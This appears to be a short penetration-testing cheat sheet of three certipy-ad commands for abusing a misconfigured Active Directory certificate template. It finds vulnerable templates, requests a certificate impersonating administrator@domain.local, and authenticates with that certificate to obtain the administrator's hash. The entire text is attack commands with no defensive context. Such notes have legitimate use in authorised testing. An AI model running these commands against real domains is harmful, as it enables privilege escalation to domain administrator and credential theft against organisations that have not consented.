# Find vulnerable templates
certipy-ad find -u user@domain.local -p pass -dc-ip $DC -vulnerable

# Request certificate for template
certipy-ad req -u user@domain.local -p pass -dc-ip $DC -target CA_IP -template VulnerableTemplate -upn administrator@domain.local

# Use certificate to get hash
certipy-ad auth -pfx administrator.pfx -dc-ip $DC